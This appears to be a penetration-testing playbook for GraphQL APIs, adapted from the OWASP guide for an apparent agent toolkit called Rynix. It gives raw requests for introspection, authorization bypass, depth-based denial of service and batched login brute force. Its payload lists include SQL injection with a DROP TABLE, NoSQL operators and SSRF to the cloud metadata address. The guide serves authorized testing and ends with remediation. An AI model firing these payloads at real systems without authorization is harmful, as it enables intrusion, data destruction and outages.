---
id: WSTG-APIT-01
title: Testing GraphQL
category: API Testing
severity_range: Low-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
---

# WSTG-APIT-01: Testing GraphQL

## Summary

GraphQL is a query language for APIs that allows clients to request exactly the data they need. While powerful, GraphQL introduces unique security challenges: introspection queries can expose the entire API schema, deeply nested queries can cause denial of service, batch queries can amplify attacks, and the flexible query nature can lead to excessive data exposure, injection attacks, and authorization bypass when resolvers lack proper access controls.

## Test Objectives

- Identify GraphQL endpoints and determine if introspection is enabled
- Enumerate the schema to understand available types, queries, and mutations
- Test for injection vulnerabilities in query arguments
- Assess authorization controls on fields and resolvers
- Test for denial of service via query depth and complexity abuse
- Check for batching attack vectors

## Prerequisites

- Target application uses GraphQL API
- Docker pentest container capturing traffic
- GraphQL endpoint identified (commonly `/graphql`, `/api/graphql`, `/gql`)

## Test Steps

### Step 1: Identify GraphQL Endpoints

**CLI Actions:**
Use `curl` to probe common GraphQL endpoint paths:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{__typename}"}
```

```
POST /api/graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{__typename}"}
```

```
GET /graphql?query={__typename} HTTP/1.1
Host: target.com
```

A response containing `{"data":{"__typename":"Query"}}` confirms a GraphQL endpoint.

Use `curl` to find GraphQL requests in proxy history:
- Pattern: `query.*\{.*\}`
- Pattern: `mutation.*\{.*\}`
- Pattern: `/graphql`

### Step 2: Test Introspection

**CLI Actions:**
Use `curl` to send a full introspection query:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{__schema{types{name,fields{name,args{name,type{name,kind}}},description}}}"}
```

Full introspection query:
```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}
```

If introspection is enabled, the response reveals the complete schema.

### Step 3: Test for Excessive Data Exposure

**CLI Actions:**
Using the discovered schema, use `curl` to query for sensitive fields:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <token>

{"query": "{ users { id email password passwordHash role apiKey ssn creditCard } }"}
```

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <token>

{"query": "{ user(id: 1) { id email role isAdmin internalNotes } }"}
```

Check if sensitive fields that should not be exposed are accessible.

### Step 4: Test Authorization on Queries and Mutations

**CLI Actions:**
Use `curl` to test accessing other users' data:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <low_privilege_token>

{"query": "{ user(id: 2) { email password role } }"}
```

Test admin-only mutations with low-privilege tokens:
```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <low_privilege_token>

{"query": "mutation { deleteUser(id: 1) { success } }"}
```

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <low_privilege_token>

{"query": "mutation { updateRole(userId: 1, role: \"admin\") { success } }"}
```

### Step 5: Test Query Depth and Complexity Abuse

**CLI Actions:**
Use `curl` to test deeply nested queries for denial of service:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ users { posts { comments { author { posts { comments { author { posts { comments { author { name } } } } } } } } } } }"}
```

Test wide queries that request many fields:
```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ users(first: 10000) { id email name role posts(first: 1000) { title body comments(first: 1000) { body author { name } } } } }"}
```

Monitor response time and server load indicators.

### Step 6: Test Batching Attacks

**CLI Actions:**
Use `curl` to send batch queries (multiple operations in one request):

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

[
  {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password3\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password4\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password5\") { token } }"}
]
```

Also test alias-based batching:
```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ a1: login(username: \"admin\", password: \"pass1\") { token } a2: login(username: \"admin\", password: \"pass2\") { token } a3: login(username: \"admin\", password: \"pass3\") { token } }"}
```

This can bypass rate limiting that counts HTTP requests rather than operations.

### Step 7: Test Injection in Arguments

**CLI Actions:**
Use `curl` to test SQL injection and NoSQL injection in GraphQL arguments:

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ user(name: \"admin' OR 1=1--\") { id email } }"}
```

```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ users(filter: \"{\\\"username\\\": {\\\"$regex\\\": \\\".*\\\"}}\") { id email } }"}
```

Use `rynix_plugin_run('template-scan')` to check for GraphQL-related findings.

## Payloads

### Introspection Queries
```graphql
# Basic type enumeration
{__schema{types{name}}}

# Full field enumeration
{__schema{types{name,fields{name,type{name,kind}}}}}

# Query/mutation discovery
{__schema{queryType{fields{name}}mutationType{fields{name}}}}

# Specific type details
{__type(name:"User"){fields{name,type{name}}}}
```

### Injection Payloads in Arguments
```
# SQL injection
"admin' OR 1=1--"
"admin'; DROP TABLE users;--"
"admin\" OR 1=1--"

# NoSQL injection
{"$gt": ""}
{"$regex": ".*"}
{"$ne": null}

# SSRF via arguments
"http://169.254.169.254/latest/meta-data/"
"http://localhost:8080/admin"
```

### Denial of Service Queries
```graphql
# Deep nesting (10+ levels)
{a{b{c{d{e{f{g{h{i{j{name}}}}}}}}}}

# Wide queries
{users(first:10000){...allFields}}

# Circular references
{user{friends{friends{friends{friends{name}}}}}}
```

### Batch Attack Payloads
```json
[
  {"query": "mutation{login(u:\"admin\",p:\"pass1\"){token}}"},
  {"query": "mutation{login(u:\"admin\",p:\"pass2\"){token}}"}
]
```

### Common GraphQL Endpoint Paths
```
/graphql
/api/graphql
/gql
/v1/graphql
/graphql/console
/graphiql
/playground
/altair
/explorer
```

### Automated GraphQL Security Testing with graphql-cop

**CLI Actions:**
Use `graphql-cop` for automated GraphQL security assessment:

```bash
rynix_plugin_run('wstg') python3 /opt/graphql-cop/graphql-cop.py -t https://target.com/graphql
```

graphql-cop tests for:
- **Introspection enabled**: Full schema disclosure — map all queries, mutations, and types
- **No query depth limit**: Allows deeply nested queries that can cause DoS
- **No query complexity limit**: Allows expensive queries that can overwhelm the server
- **Batch query support**: Enables amplification attacks via batched operations
- **Field suggestions**: Information disclosure through auto-complete suggestions

All graphql-cop findings are generally reliable. For introspection findings, follow up by downloading the full schema:
```bash
http_probe -sk -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' https://target.com/graphql
```

## Detection Criteria

A finding should be logged when:
- GraphQL introspection is enabled in production
- Sensitive fields are exposed without authorization checks
- Authorization is missing or bypassable on queries and mutations
- No query depth or complexity limits are enforced
- Batching allows brute force attacks bypassing rate limits
- Injection attacks succeed through GraphQL arguments
- GraphQL playground/IDE is accessible in production

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| SQL/NoSQL injection via GraphQL arguments | High |
| Authorization bypass on mutations (delete, update other users) | High |
| Sensitive data exposure (passwords, API keys) via queries | High |
| Batch brute force bypasses authentication rate limiting | Medium |
| Introspection enabled, exposing full schema in production | Medium |
| No query depth limits, DoS via deeply nested queries | Medium |
| IDOR - accessing other users' data via ID enumeration | Medium |
| GraphQL playground accessible in production | Low |
| Introspection disabled but schema guessable via error messages | Low |
| Introspection disabled, authorization enforced, depth limits set | Not a finding |

## Remediation

- Disable introspection in production environments
- Implement field-level authorization checks in all resolvers
- Set query depth limits (max 5-10 levels)
- Set query complexity limits (max cost per query)
- Disable or limit batch queries
- Rate limit by operation count, not just HTTP request count
- Validate and sanitize all input arguments (use parameterized queries)
- Use a query allowlist (persisted queries) in production
- Remove GraphQL playground/IDE from production
- Implement proper error handling that does not leak schema information
- Use query cost analysis to prevent resource-intensive queries
- Limit pagination (max first/last values)

## References

- [OWASP Testing Guide - Testing GraphQL](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [GraphQL Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V13 API and Web Service — schema, auth, and rate limiting.
- V4 Access Control — BOLA/IDOR on API object references.

## CWE references

- CWE-285: Improper Authorization
- CWE-770: Allocation of Resources Without Limits

## Rynix tooling

- Primary tools: ``list_api_routes``, ``export_openapi_stub``, ``run_idor_matrix``, ``http_probe``

## Test focus

- Diff OpenAPI spec vs live routes from `analyze_repo`.
- Test batch/GraphQL endpoints for authorization per field.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

